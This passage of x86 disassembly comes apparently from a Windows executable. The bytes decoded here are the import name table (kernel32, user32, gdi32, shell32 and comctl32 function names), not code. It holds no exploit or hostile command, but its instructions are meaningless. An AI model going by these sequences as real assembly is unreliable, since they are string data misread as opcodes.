  40cd2f:	add    BYTE PTR [esi-0x2dffff33],bh
  40cd35:	into   
  40cd36:	add    BYTE PTR [eax],al
  40cd38:	add    BYTE PTR [eax],al
  40cd3a:	add    BYTE PTR [eax],al
  40cd3c:	cmc    
  40cd3d:	add    DWORD PTR [edi+0x65],eax
  40cd40:	je     0x40cd8f
  40cd42:	outs   dx,DWORD PTR ds:[esi]
  40cd43:	fs jne 0x40cdb2
  40cd46:	gs inc esi
  40cd48:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  40cd50:	add    BYTE PTR [eax],al
  40cd52:	sbb    eax,0x74654702
  40cd57:	push   eax
  40cd58:	jb     0x40cdc3
  40cd5a:	jbe    0x40cdbd
  40cd5c:	je     0x40cdc3
  40cd5e:	push   eax
  40cd5f:	jb     0x40cdd0
  40cd61:	imul   bp,WORD PTR [ebp+eiz*2+0x53],0x7274
  40cd68:	imul   ebp,DWORD PTR [esi+0x67],0x65000057
  40cd6f:	add    BYTE PTR [ebx+0x6f],al
  40cd72:	jo     0x40cded
  40cd74:	inc    esi
  40cd75:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53042100
  40cd7d:	ins    BYTE PTR es:[edi],dx
  40cd7e:	gs gs jo 0x40cd82
  40cd82:	and    al,0x1
  40cd84:	inc    esi
  40cd85:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  40cd8c:	je     0x40cdd4
  40cd8e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x1300000
  40cd96:	inc    esi
  40cd97:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  40cd9e:	inc    esi
  40cd9f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x46011900
  40cda7:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  40cdae:	add    BYTE PTR gs:[ebx+0x45],cl
  40cdb2:	push   edx
  40cdb3:	dec    esi
  40cdb4:	inc    ebp
  40cdb5:	dec    esp
  40cdb6:	xor    esi,DWORD PTR [edx]
  40cdb8:	cs fs ins BYTE PTR es:[edi],dx
  40cdbb:	ins    BYTE PTR es:[edi],dx
  40cdbc:	add    BYTE PTR [eax],al
  40cdbe:	in     al,0x1
  40cdc0:	dec    esp
  40cdc1:	outs   dx,DWORD PTR ds:[esi]
  40cdc2:	popa   
  40cdc3:	fs push ebx
  40cdc5:	je     0x40ce39
  40cdc7:	imul   ebp,DWORD PTR [esi+0x67],0x1cf0057
  40cdce:	dec    esp
  40cdcf:	outs   dx,DWORD PTR ds:[esi]
  40cdd0:	popa   
  40cdd1:	fs inc ecx
  40cdd3:	arpl   WORD PTR [ebx+0x65],sp
  40cdd6:	ins    BYTE PTR es:[edi],dx
  40cdd7:	gs jb  0x40ce3b
  40cdda:	je     0x40ce4b
  40cddc:	jb     0x40ce51
  40cdde:	push   edi
  40cddf:	add    BYTE PTR [esi+0x1],cl
  40cde2:	inc    edi
  40cde3:	gs je  0x40ce33
  40cde6:	gs jae 0x40ce5c
  40cde9:	popa   
  40cdea:	addr16 gs push edi
  40cded:	add    bl,dl
  40cdef:	add    dl,BYTE PTR [edx+esi*2+0x61]
  40cdf3:	outs   dx,BYTE PTR ds:[esi]
  40cdf4:	jae    0x40ce62
  40cdf6:	popa   
  40cdf7:	je     0x40ce5e
  40cdf9:	inc    ecx
  40cdfa:	arpl   WORD PTR [ebx+0x65],sp
  40cdfd:	ins    BYTE PTR es:[edi],dx
  40cdfe:	gs jb  0x40ce62
  40ce01:	je     0x40ce72
  40ce03:	jb     0x40ce5c
  40ce05:	add    ch,dl
  40ce07:	add    dl,BYTE PTR [edx+esi*2+0x61]
  40ce0b:	outs   dx,BYTE PTR ds:[esi]
  40ce0c:	jae    0x40ce7a
  40ce0e:	popa   
  40ce0f:	je     0x40ce76
  40ce11:	dec    ebp
  40ce12:	gs jae 0x40ce88
  40ce15:	popa   
  40ce16:	add    BYTE PTR gs:[bx+si],al
  40ce1a:	test   eax,0x73694400
  40ce1f:	jo     0x40ce82
  40ce21:	je     0x40ce86
  40ce23:	push   0x7373654d
  40ce28:	popa   
  40ce29:	addr16 gs push edi
  40ce2c:	add    BYTE PTR [eax],al
  40ce2e:	xlat   BYTE PTR ds:[ebx]
  40ce2f:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  40ce33:	fs dec ecx
  40ce35:	arpl   WORD PTR [edi+0x6e],bp
  40ce38:	push   edi
  40ce39:	add    ch,dl
  40ce3b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  40ce3f:	fs inc ebx
  40ce41:	jne    0x40ceb5
  40ce43:	jae    0x40ceb4
  40ce45:	jb     0x40ce9e
  40ce47:	add    BYTE PTR ds:0x67655202,dh
  40ce4d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  40ce54:	popa   
  40ce55:	jae    0x40ceca
  40ce57:	inc    ebp
  40ce58:	js     0x40ceb1
  40ce5a:	add    BYTE PTR [eax],al
  40ce5c:	push   0x65724300
  40ce61:	popa   
  40ce62:	je     0x40cec9
  40ce64:	push   edi
  40ce65:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  40ce6c:	push   edi
  40ce6d:	add    BYTE PTR [edi+0x1],ch
  40ce70:	inc    edi
  40ce71:	gs je  0x40cec7
  40ce74:	jns    0x40cee9
  40ce76:	je     0x40cedd
  40ce78:	ins    DWORD PTR es:[edi],dx
  40ce79:	dec    ebp
  40ce7a:	gs je  0x40ceef
  40ce7d:	imul   esp,DWORD PTR [ebx+0x73],0x2a70000
  40ce84:	push   ebx
  40ce85:	gs je  0x40cedf
  40ce88:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  40ce8f:	jae    0x40ce91
  40ce91:	add    BYTE PTR [eax+0x6f685302],bh
  40ce97:	ja     0x40cef0
  40ce99:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  40cea0:	jmp    0x64b123a7
  40cea5:	popa   
  40cea6:	je     0x40cf0d
  40cea8:	push   edi
  40cea9:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  40ceb0:	pop    DWORD PTR [ecx]
  40ceb2:	inc    edi
  40ceb3:	gs je  0x40cf0d
  40ceb6:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  40cebd:	js     0x40cf33
  40cebf:	push   edi
  40cec0:	add    BYTE PTR [eax],al
  40cec2:	rol    DWORD PTR [eax],1
  40cec4:	inc    ebp
  40cec5:	outs   dx,BYTE PTR ds:[esi]
  40cec6:	popa   
  40cec7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  40cecb:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  40ced2:	pop    ds
  40ced3:	add    DWORD PTR [edi+0x65],eax
  40ced6:	je     0x40cf1c
  40ced8:	ins    BYTE PTR es:[edi],dx
  40ced9:	addr16 dec ecx
  40cedb:	je     0x40cf42
  40cedd:	ins    DWORD PTR es:[edi],dx
  40cede:	add    BYTE PTR [eax],al
  40cee0:	repz add BYTE PTR [esi+0x69],al
  40cee4:	outs   dx,BYTE PTR ds:[esi]
  40cee5:	fs push edi
  40cee7:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  40ceee:	pop    ds
  40ceef:	add    dl,BYTE PTR [eax+0x6f]
  40cef2:	jae    0x40cf68
  40cef4:	dec    ebp
  40cef5:	gs jae 0x40cf6b
  40cef8:	popa   
  40cef9:	addr16 gs push edi
  40cefc:	add    BYTE PTR [eax],al
  40cefe:	mov    al,ds:0x73654400
  40cf03:	je     0x40cf77
  40cf05:	outs   dx,DWORD PTR ds:[esi]
  40cf06:	jns    0x40cf5f
  40cf08:	imul   ebp,DWORD PTR [esi+0x64],0x9600776f
  40cf0f:	add    BYTE PTR [ebp+eiz*2+0x66],al
  40cf13:	push   edi
  40cf14:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  40cf1b:	outs   dx,DWORD PTR ds:[esi]
  40cf1c:	arpl   WORD PTR [edi+0x0],dx
  40cf1f:	add    BYTE PTR [esi],cl
  40cf21:	add    BYTE PTR [edx+0x65],al
  40cf24:	imul   ebp,DWORD PTR [bp+0x50],0x746e6961
  40cf2c:	add    BYTE PTR [eax],al
  40cf2e:	aad    0x0
  40cf30:	inc    ebp
  40cf31:	outs   dx,BYTE PTR ds:[esi]
  40cf32:	fs push eax
  40cf34:	popa   
  40cf35:	imul   ebp,DWORD PTR [esi+0x74],0x2200000
  40cf3c:	push   eax
  40cf3d:	outs   dx,DWORD PTR ds:[esi]
  40cf3e:	jae    0x40cfb4
  40cf40:	push   ecx
  40cf41:	jne    0x40cfac
  40cf43:	je     0x40cf92
  40cf45:	gs jae 0x40cfbb
  40cf48:	popa   
  40cf49:	add    BYTE PTR gs:[bp+di+0x2],ah
  40cf4e:	push   ebx
  40cf4f:	outs   dx,BYTE PTR gs:[esi]
  40cf51:	fs dec ebp
  40cf53:	gs jae 0x40cfc9
  40cf56:	popa   
  40cf57:	addr16 gs push edi
  40cf5a:	add    BYTE PTR [eax],al
  40cf5c:	rol    DWORD PTR [ecx],1
  40cf5e:	dec    esp
  40cf5f:	outs   dx,DWORD PTR ds:[esi]
  40cf60:	popa   
  40cf61:	fs inc edx
  40cf63:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xac005770
  40cf6b:	add    dl,BYTE PTR [ebx+0x65]
  40cf6e:	je     0x40cfc7
  40cf70:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  40cf77:	js     0x40cfed
  40cf79:	push   edi
  40cf7a:	add    BYTE PTR [eax],al
  40cf7c:	push   ebp
  40cf7d:	push   ebx
  40cf7e:	inc    ebp
  40cf7f:	push   edx
  40cf80:	xor    esi,DWORD PTR [edx]
  40cf82:	cs fs ins BYTE PTR es:[edi],dx
  40cf85:	ins    BYTE PTR es:[edi],dx
  40cf86:	add    BYTE PTR [eax],al
  40cf88:	hlt    
  40cf89:	add    DWORD PTR [edi+0x65],eax
  40cf8c:	je     0x40cfe1
  40cf8e:	je     0x40cfff
  40cf90:	arpl   WORD PTR [ebx+0x4f],bp
  40cf93:	bound  ebp,QWORD PTR [edx+0x65]
  40cf96:	arpl   WORD PTR [eax+eax*1+0x0],si
  40cf9a:	inc    edi
  40cf9b:	inc    esp
  40cf9c:	dec    ecx
  40cf9d:	xor    esi,DWORD PTR [edx]
  40cf9f:	cs fs ins BYTE PTR es:[edi],dx
  40cfa2:	ins    BYTE PTR es:[edi],dx
  40cfa3:	add    BYTE PTR [edi],dl
  40cfa5:	add    DWORD PTR [ebx+0x68],edx
  40cfa8:	gs ins BYTE PTR es:[edi],dx
  40cfaa:	ins    BYTE PTR es:[edi],dx
  40cfab:	inc    ebp
  40cfac:	js     0x40d013
  40cfae:	arpl   WORD PTR [ebp+0x74],si
  40cfb1:	gs inc ebp
  40cfb3:	js     0x40d00c
  40cfb5:	add    BYTE PTR [ebx+0x48],dl
  40cfb8:	inc    ebp
  40cfb9:	dec    esp
  40cfba:	dec    esp
  40cfbb:	xor    esi,DWORD PTR [edx]
  40cfbd:	cs fs ins BYTE PTR es:[edi],dx
  40cfc0:	ins    BYTE PTR es:[edi],dx
  40cfc1:	add    BYTE PTR [esi],dh
  40cfc3:	add    DWORD PTR [ebx+0x74],edx
  40cfc6:	jb     0x40d01a
  40cfc8:	inc    ebx
  40cfc9:	push   0x5772
  40cfce:	and    eax,DWORD PTR [ecx]
  40cfd0:	push   ebx
  40cfd1:	je     0x40d045
  40cfd3:	inc    ebx
  40cfd4:	jo     0x40d04f
  40cfd6:	push   edi
  40cfd7:	add    BYTE PTR [ecx+eax*1],cl
  40cfda:	push   ebx
  40cfdb:	je     0x40d04f
  40cfdd:	inc    ebx
  40cfde:	popa   
  40cfdf:	je     0x40d038
  40cfe1:	add    BYTE PTR [edx+0x1],al
  40cfe4:	push   ebx
  40cfe5:	je     0x40d059
  40cfe7:	push   ebx
  40cfe8:	je     0x40d05c
  40cfea:	dec    ecx
  40cfeb:	push   edi
  40cfec:	add    BYTE PTR [eax],al
  40cfee:	push   ebx
  40cfef:	dec    eax
  40cff0:	dec    esp
  40cff1:	push   edi
  40cff2:	inc    ecx
  40cff3:	push   eax
  40cff4:	dec    ecx
  40cff5:	cs fs ins BYTE PTR es:[edi],dx
  40cff8:	ins    BYTE PTR es:[edi],dx
  40cff9:	add    BYTE PTR [edx+0x0],bh
  40cffc:	dec    ecx
  40cffd:	outs   dx,BYTE PTR ds:[esi]
  40cffe:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  40d006:	inc    ebx
  40d007:	outs   dx,DWORD PTR ds:[esi]
  40d008:	outs   dx,BYTE PTR ds:[esi]
  40d009:	je     0x40d07d
  40d00b:	outs   dx,DWORD PTR ds:[esi]
  40d00c:	ins    BYTE PTR es:[edi],dx
  40d00d:	jae    0x40d054
  40d00f:	js     0x40d011
  40d011:	add    BYTE PTR [ebx+0x4f],al
  40d014:	dec    ebp
  40d015:	inc    ebx
  40d016:	push   esp
  40d017:	dec    esp
  40d018:	xor    esi,DWORD PTR [edx]
  40d01a:	cs fs ins BYTE PTR es:[edi],dx
  40d01d:	ins    BYTE PTR es:[edi],dx
  40d01e:	add    BYTE PTR [eax],al
  40d020:	pop    es
  40d021:	add    DWORD PTR [ebp+0x78],eax
  40d024:	jo     0x40d087
  40d026:	outs   dx,BYTE PTR ds:[esi]
  40d027:	fs inc ebp
  40d029:	outs   dx,BYTE PTR ds:[esi]
  40d02a:	jbe    0x40d095
  40d02c:	jb     0x40d09d
  40d02e:	outs   dx,BYTE PTR ds:[esi]
  40d02f:	ins    DWORD PTR es:[edi],dx
  40d030:	outs   dx,BYTE PTR gs:[esi]
  40d032:	je     0x40d087
  40d034:	je     0x40d0a8
  40d036:	imul   ebp,DWORD PTR [esi+0x67],0x20004173
  40d03d:	add    al,BYTE PTR [edi+0x65]
  40d040:	je     0x40d092
  40d042:	jb     0x40d0b3
  40d044:	arpl   WORD PTR [ecx+0x64],ax
  40d047:	fs jb  0x40d0af
  40d04a:	jae    0x40d0bf
  40d04c:	add    BYTE PTR [eax],al
  40d04e:	icebp  
  40d04f:	add    cl,BYTE PTR [edi+ebp*2+0x61]
  40d053:	fs dec esp
  40d055:	imul   esp,DWORD PTR [edx+0x72],0x41797261
  40d05c:	add    BYTE PTR [eax],al
  40d05e:	out    0x1,al
  40d060:	inc    edi
  40d061:	gs je  0x40d0b0
  40d064:	popa   
  40d065:	jae    0x40d0db
  40d067:	inc    ebp
  40d068:	jb     0x40d0dc
  40d06a:	outs   dx,DWORD PTR ds:[esi]
  40d06b:	jb     0x40d06d
  40d06d:	add    cl,dl
  40d06f:	add    edx,DWORD PTR [ebx+0x65]
  40d072:	je     0x40d0b9
  40d074:	outs   dx,BYTE PTR ds:[esi]
  40d075:	jbe    0x40d0e0
  40d077:	jb     0x40d0e8
  40d079:	outs   dx,BYTE PTR ds:[esi]
  40d07a:	ins    DWORD PTR es:[edi],dx
  40d07b:	outs   dx,BYTE PTR gs:[esi]
  40d07d:	je     0x40d0d5
  40d07f:	popa   
  40d080:	jb     0x40d0eb
  40d082:	popa   
  40d083:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  40d087:	add    BYTE PTR [eax+0x74654701],ch
  40d08d:	inc    ebx
  40d08e:	jne    0x40d102
  40d090:	jb     0x40d0f7
  40d092:	outs   dx,BYTE PTR ds:[esi]
  40d093:	je     0x40d0d9
  40d095:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40d09c:	jns    0x40d0f5
  40d09e:	add    BYTE PTR [eax],al
  40d0a0:	mov    DWORD PTR [ebx],0x43746553
  40d0a6:	jne    0x40d11a
  40d0a8:	jb     0x40d10f
  40d0aa:	outs   dx,BYTE PTR ds:[esi]
  40d0ab:	je     0x40d0f1
  40d0ad:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40d0b4:	jns    0x40d10d
  40d0b6:	add    BYTE PTR [eax],al
  40d0b8:	cmp    al,BYTE PTR [edx]
  40d0ba:	inc    edi
  40d0bb:	gs je  0x40d111
  40d0be:	je     0x40d121
  40d0c0:	jb     0x40d136
  40d0c2:	jne    0x40d134
  40d0c4:	dec    ecx
  40d0c5:	outs   dx,BYTE PTR ds:[esi]
  40d0c6:	outs   dx,WORD PTR ds:[esi]
  40d0c8:	push   edi
  40d0c9:	add    BYTE PTR ds:0x72655404,ch
  40d0cf:	ins    DWORD PTR es:[edi],dx
  40d0d0:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  40d0d7:	outs   dx,DWORD PTR ds:[esi]
  40d0d8:	arpl   WORD PTR [ebp+0x73],sp
  40d0db:	jae    0x40d0dd
  40d0dd:	add    BYTE PTR [ecx+0x74654701],ch
  40d0e3:	inc    ebx
  40d0e4:	jne    0x40d158
  40d0e6:	jb     0x40d14d
  40d0e8:	outs   dx,BYTE PTR ds:[esi]
  40d0e9:	je     0x40d13b
  40d0eb:	jb     0x40d15c
  40d0ed:	arpl   WORD PTR [ebp+0x73],sp
  40d0f0:	jae    0x40d0f2
  40d0f2:	ds add al,0x55
  40d0f5:	outs   dx,BYTE PTR ds:[esi]
  40d0f6:	push   0x6c646e61
  40d0fb:	gs fs inc ebp
  40d0fe:	js     0x40d163
  40d100:	gs jo  0x40d177
  40d103:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40d10a:	gs jb  0x40d10d
  40d10d:	add    BYTE PTR ds:0x74655304,dl
  40d113:	push   ebp
  40d114:	outs   dx,BYTE PTR ds:[esi]
  40d115:	push   0x6c646e61
  40d11a:	gs fs inc ebp
  40d11d:	js     0x40d182
  40d11f:	gs jo  0x40d196
  40d122:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40d129:	gs jb  0x40d12c
  40d12c:	rol    DWORD PTR [edx],1
  40d12e:	dec    ecx
  40d12f:	jae    0x40d175
  40d131:	bound  esi,QWORD PTR gs:[ebp+0x67]
  40d135:	addr16 gs jb 0x40d189
  40d139:	jb     0x40d1a0
  40d13b:	jae    0x40d1a2
  40d13d:	outs   dx,BYTE PTR ds:[esi]
  40d13e:	je     0x40d140
  40d140:	mov    eax,ds:0x61654802
  40d145:	jo     0x40d18d
  40d147:	jb     0x40d1ae
  40d149:	add    BYTE PTR gs:[eax],al
  40d14c:	stc    
  40d14d:	add    DWORD PTR [edi+0x65],eax
  40d150:	je     0x40d19f
  40d152:	outs   dx,DWORD PTR ds:[esi]
  40d153:	fs jne 0x40d1c2
  40d156:	gs dec eax
  40d158:	popa   
  40d159:	outs   dx,BYTE PTR ds:[esi]
  40d15a:	fs ins BYTE PTR es:[edi],dx
  40d15c:	gs push edi
  40d15e:	add    BYTE PTR [eax],al
  40d160:	add    al,0x1
  40d162:	inc    ebp
  40d163:	js     0x40d1ce
  40d165:	je     0x40d1b7
  40d167:	jb     0x40d1d8
  40d169:	arpl   WORD PTR [ebp+0x73],sp
  40d16c:	jae    0x40d16e
  40d16e:	lea    eax,[edi+edx*2]
  40d171:	jb     0x40d1dc
  40d173:	je     0x40d1da
  40d175:	inc    esi
  40d176:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6547023b
  40d17e:	je     0x40d1d3
  40d180:	je     0x40d1e6
  40d182:	dec    eax
  40d183:	popa   
  40d184:	outs   dx,BYTE PTR ds:[esi]
  40d185:	fs ins BYTE PTR es:[edi],dx
  40d187:	add    BYTE PTR gs:[eax],al
  40d18a:	hlt    
  40d18b:	add    DWORD PTR [edi+0x65],eax
  40d18e:	je     0x40d1dd
  40d190:	outs   dx,DWORD PTR ds:[esi]
  40d191:	fs jne 0x40d200
  40d194:	gs inc esi
  40d196:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  40d19e:	add    BYTE PTR [eax],al
  40d1a0:	dec    ebx
  40d1a1:	add    DWORD PTR [esi+0x72],eax
  40d1a4:	gs gs inc ebp
  40d1a7:	outs   dx,BYTE PTR ds:[esi]
  40d1a8:	jbe    0x40d213
  40d1aa:	jb     0x40d21b
  40d1ac:	outs   dx,BYTE PTR ds:[esi]
  40d1ad:	ins    DWORD PTR es:[edi],dx
  40d1ae:	outs   dx,BYTE PTR gs:[esi]
  40d1b0:	je     0x40d205
  40d1b2:	je     0x40d226
  40d1b4:	imul   ebp,DWORD PTR [esi+0x67],0xc1005773
  40d1bb:	add    DWORD PTR [edi+0x65],eax
  40d1be:	je     0x40d205
  40d1c0:	outs   dx,BYTE PTR ds:[esi]
  40d1c1:	jbe    0x40d22c
  40d1c3:	jb     0x40d234
  40d1c5:	outs   dx,BYTE PTR ds:[esi]
  40d1c6:	ins    DWORD PTR es:[edi],dx
  40d1c7:	outs   dx,BYTE PTR gs:[esi]
  40d1c9:	je     0x40d21e
  40d1cb:	je     0x40d23f
  40d1cd:	imul   ebp,DWORD PTR [esi+0x67],0x5773
  40d1d4:	jo     0x40d1d7
  40d1d6:	inc    edi
  40d1d7:	gs je  0x40d21d
  40d1da:	outs   dx,DWORD PTR ds:[esi]
  40d1db:	ins    DWORD PTR es:[edi],dx
  40d1dc:	ins    DWORD PTR es:[edi],dx
  40d1dd:	popa   
  40d1de:	outs   dx,BYTE PTR ds:[esi]
  40d1df:	fs dec esp
  40d1e1:	imul   ebp,DWORD PTR [esi+0x65],0x3e80057
  40d1e8:	push   ebx
  40d1e9:	gs je  0x40d234
  40d1ec:	popa   
  40d1ed:	outs   dx,BYTE PTR ds:[esi]
  40d1ee:	fs ins BYTE PTR es:[edi],dx
  40d1f0:	gs inc ebx
  40d1f2:	outs   dx,DWORD PTR ds:[esi]
  40d1f3:	jne    0x40d263
  40d1f5:	je     0x40d1f7
  40d1f7:	add    bh,dl
  40d1f9:	add    DWORD PTR [edi+0x65],eax
  40d1fc:	je     0x40d244
  40d1fe:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  40d206:	cmp    DWORD PTR [edx],eax
  40d208:	inc    edi
  40d209:	gs je  0x40d25f
  40d20c:	je     0x40d26f
  40d20e:	jb     0x40d284
  40d210:	jne    0x40d282
  40d212:	dec    ecx
  40d213:	outs   dx,BYTE PTR ds:[esi]
  40d214:	outs   dx,WORD PTR ds:[esi]
  40d216:	inc    ecx
  40d217:	add    BYTE PTR [esi+0x6c654400],bh
  40d21d:	gs je  0x40d285
  40d220:	inc    ebx
  40d221:	jb     0x40d28c
  40d223:	je     0x40d28e
  40d225:	arpl   WORD PTR [ecx+0x6c],sp
  40d228:	push   ebx
  40d229:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40d22e:	outs   dx,BYTE PTR ds:[esi]
  40d22f:	add    BYTE PTR [esp+eax*1],dh
  40d232:	push   esp
  40d233:	ins    BYTE PTR es:[edi],dx
  40d234:	jae    0x40d27d
  40d236:	gs je  0x40d28f
  40d239:	popa   
  40d23a:	ins    BYTE PTR es:[edi],dx
  40d23b:	jne    0x40d2a2
  40d23d:	add    BYTE PTR [edx],dh
  40d23f:	add    al,0x54
  40d241:	ins    BYTE PTR es:[edi],dx
  40d242:	jae    0x40d285
  40d244:	ins    BYTE PTR es:[edi],dx
  40d245:	ins    BYTE PTR es:[edi],dx
  40d246:	outs   dx,DWORD PTR ds:[esi]
  40d247:	arpl   WORD PTR [eax],ax
  40d249:	add    BYTE PTR ds:0x736c5404,dh
  40d24f:	push   ebx
  40d250:	gs je  0x40d2a9
  40d253:	popa   
  40d254:	ins    BYTE PTR es:[edi],dx
  40d255:	jne    0x40d2bc
  40d257:	add    BYTE PTR [ebx],dh
  40d259:	add    al,0x54
  40d25b:	ins    BYTE PTR es:[edi],dx
  40d25c:	jae    0x40d2a4
  40d25e:	jb     0x40d2c5
  40d260:	gs add al,al
  40d263:	add    cl,BYTE PTR [ecx+0x6e]
  40d266:	je     0x40d2cd
  40d268:	jb     0x40d2d6
  40d26a:	outs   dx,DWORD PTR ds:[esi]
  40d26b:	arpl   WORD PTR [ebx+0x65],bp
  40d26e:	fs dec ecx
  40d270:	outs   dx,BYTE PTR ds:[esi]
  40d271:	arpl   WORD PTR [edx+0x65],si
  40d274:	ins    DWORD PTR es:[edi],dx
  40d275:	outs   dx,BYTE PTR gs:[esi]
  40d277:	je     0x40d279
  40d279:	add    ah,ch
  40d27b:	add    edx,DWORD PTR [ebx+0x65]
  40d27e:	je     0x40d2cc
  40d280:	popa   
  40d281:	jae    0x40d2f7
  40d283:	inc    ebp
  40d284:	jb     0x40d2f8
  40d286:	outs   dx,DWORD PTR ds:[esi]
  40d287:	jb     0x40d289
  40d289:	add    BYTE PTR [ebp+0x74654701],ch
  40d28f:	inc    ebx
  40d290:	jne    0x40d304
  40d292:	jb     0x40d2f9
  40d294:	outs   dx,BYTE PTR ds:[esi]
  40d295:	je     0x40d2eb
  40d297:	push   0x64616572
  40d29c:	dec    ecx
  40d29d:	add    BYTE PTR fs:[eax],al
  40d2a0:	mov    esp,0x746e4902
  40d2a5:	gs jb  0x40d314
  40d2a8:	outs   dx,DWORD PTR ds:[esi]
  40d2a9:	arpl   WORD PTR [ebx+0x65],bp
  40d2ac:	fs inc esp
  40d2ae:	arpl   WORD PTR gs:[edx+0x65],si
  40d2b2:	ins    DWORD PTR es:[edi],dx
  40d2b3:	outs   dx,BYTE PTR gs:[esi]
  40d2b5:	je     0x40d2b7
  40d2b7:	add    BYTE PTR [edi+0x61654802],bl
  40d2bd:	jo     0x40d302
  40d2bf:	jb     0x40d326
  40d2c1:	popa   
  40d2c2:	je     0x40d329
  40d2c4:	add    BYTE PTR [eax],al
  40d2c6:	push   edi
  40d2c7:	add    al,0x56
  40d2c9:	imul   esi,DWORD PTR [edx+0x74],0x466c6175
  40d2d0:	jb     0x40d337
  40d2d2:	add    BYTE PTR gs:[ebx+eax*1+0x51],dl
  40d2d7:	jne    0x40d33e
  40d2d9:	jb     0x40d354
  40d2db:	push   eax
  40d2dc:	gs jb  0x40d345
  40d2df:	outs   dx,DWORD PTR ds:[esi]
  40d2e0:	jb     0x40d34f
  40d2e2:	popa   
  40d2e3:	outs   dx,BYTE PTR ds:[esi]
  40d2e4:	arpl   WORD PTR [ebp+0x43],sp
  40d2e7:	outs   dx,DWORD PTR ds:[esi]
  40d2e8:	jne    0x40d358
  40d2ea:	je     0x40d351
  40d2ec:	jb     0x40d2ee
  40d2ee:	data16 add al,BYTE PTR [edi+0x65]
  40d2f2:	je     0x40d348
  40d2f4:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  40d2fb:	je     0x40d2fd
  40d2fd:	add    BYTE PTR [edx+0x74654701],ch
  40d303:	inc    ebx
  40d304:	jne    0x40d378
  40d306:	jb     0x40d36d
  40d308:	outs   dx,BYTE PTR ds:[esi]
  40d309:	je     0x40d35b
  40d30b:	jb     0x40d37c
  40d30d:	arpl   WORD PTR [ebp+0x73],sp
  40d310:	jae    0x40d35b
  40d312:	add    BYTE PTR fs:[edi+0x2],cl
  40d316:	inc    edi
  40d317:	gs je  0x40d36d
  40d31a:	jns    0x40d38f
  40d31c:	je     0x40d383
  40d31e:	ins    DWORD PTR es:[edi],dx
  40d31f:	push   esp
  40d320:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  40d327:	ins    BYTE PTR es:[edi],dx
  40d328:	gs push esp
  40d32a:	imul   ebp,DWORD PTR [ebp+0x65],0x5303df00
  40d331:	gs je  0x40d37a
  40d334:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  40d33c:	gs jb  0x40d33f
  40d33f:	add    BYTE PTR [edx+0x4],bh
  40d342:	push   edi
  40d343:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  40d34b:	outs   dx,DWORD PTR ds:[esi]
  40d34c:	dec    ebp
  40d34d:	jne    0x40d3bb
  40d34f:	je     0x40d3ba
  40d351:	inc    edx
  40d352:	jns    0x40d3c8
  40d354:	add    BYTE PTR gs:[ebx+0x74654701],al
  40d35b:	inc    ebx
  40d35c:	outs   dx,DWORD PTR ds:[esi]
  40d35d:	outs   dx,BYTE PTR ds:[esi]
  40d35e:	jae    0x40d3cf
  40d360:	ins    BYTE PTR es:[edi],dx
  40d361:	gs inc ebx
  40d363:	push   eax
  40d364:	add    BYTE PTR [eax],al
  40d366:	xchg   ebp,eax
  40d367:	add    DWORD PTR [edi+0x65],eax
  40d36a:	je     0x40d3af
  40d36c:	outs   dx,DWORD PTR ds:[esi]
  40d36d:	outs   dx,BYTE PTR ds:[esi]
  40d36e:	jae    0x40d3df
  40d370:	ins    BYTE PTR es:[edi],dx
  40d371:	gs dec ebp
  40d373:	outs   dx,DWORD PTR ds:[esi]
  40d374:	fs add BYTE PTR gs:[eax],al
  40d378:	fld    DWORD PTR [eax]
  40d37a:	inc    ebp
  40d37b:	outs   dx,BYTE PTR ds:[esi]
  40d37c:	je     0x40d3e3
  40d37e:	jb     0x40d3c3
  40d380:	jb     0x40d3eb
  40d382:	je     0x40d3ed
  40d384:	arpl   WORD PTR [ecx+0x6c],sp
  40d387:	push   ebx
  40d388:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40d38d:	outs   dx,BYTE PTR ds:[esi]
  40d38e:	add    BYTE PTR [eax],al
  40d390:	out    dx,eax
  40d391:	add    cl,BYTE PTR [ebp+eiz*2+0x61]
  40d395:	jbe    0x40d3fc
  40d397:	inc    ebx
  40d398:	jb     0x40d403
  40d39a:	je     0x40d405
  40d39c:	arpl   WORD PTR [ecx+0x6c],sp
  40d39f:	push   ebx
  40d3a0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40d3a5:	outs   dx,BYTE PTR ds:[esi]
  40d3a6:	add    BYTE PTR [eax],al
  40d3a8:	pop    ebx
  40d3a9:	add    DWORD PTR [edi+0x65],eax
  40d3ac:	je     0x40d3f1
  40d3ae:	push   eax
